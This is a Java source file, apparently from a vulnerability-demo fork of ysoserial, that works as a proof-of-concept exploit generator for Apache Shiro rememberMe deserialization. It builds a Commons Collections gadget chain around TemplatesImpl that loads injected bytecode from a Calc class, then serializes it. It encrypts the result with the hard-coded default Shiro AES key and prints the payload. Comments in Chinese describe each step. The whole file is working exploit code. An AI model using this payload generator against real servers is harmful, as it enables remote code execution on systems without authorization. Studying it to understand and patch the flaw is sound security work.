package ysoserial.vulndemo;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.NotFoundException;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class shiro_POC1 {
    public static void setFieldValue(Object obj, String fieldname, Object value) throws NoSuchFieldException, IllegalAccessException {
        Field field = obj.getClass().getDeclaredField(fieldname);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static byte[] getPayload() throws NotFoundException, IOException, CannotCompileException, NoSuchFieldException, IllegalAccessException {
        //恶意字节码得加载
        byte[] bytes = ClassPool.getDefault().get("ysoserial.vulndemo.Calc").toBytecode();
        //创建TemplatesImpl利用链
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_name", "RoboTerh");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        setFieldValue(templates, "_bytecodes", new byte[][]{bytes});
        //创建一个无害的InvokerTransformer防止触发payload
        Transformer transformer = new InvokerTransformer("getClass", null, null);
        Map innerMap = new HashMap();
        Map outMap = LazyMap.decorate(innerMap, transformer);

        TiedMapEntry tme = new TiedMapEntry(outMap, templates);

        Map expMap = new HashMap();
        expMap.put(tme, "aaa");
        //消除TiedMapEntry得影响
        outMap.clear();
        //将恶意transformer还原
        setFieldValue(transformer, "iMethodName", "newTransformer");

        //生成序列化字符串
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(expMap);
        objectOutputStream.close();
        return byteArrayOutputStream.toByteArray();
    }

    public static void main(String[] args) throws NotFoundException, IOException, CannotCompileException, NoSuchFieldException, IllegalAccessException {
        //生成shiro的payload
        byte[] payload = getPayload();
        AesCipherService aes = new AesCipherService();
        //key值得解码
        byte[] key = Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
        ByteSource encrypt = aes.encrypt(payload, key);
        System.out.println(encrypt);
    }
}
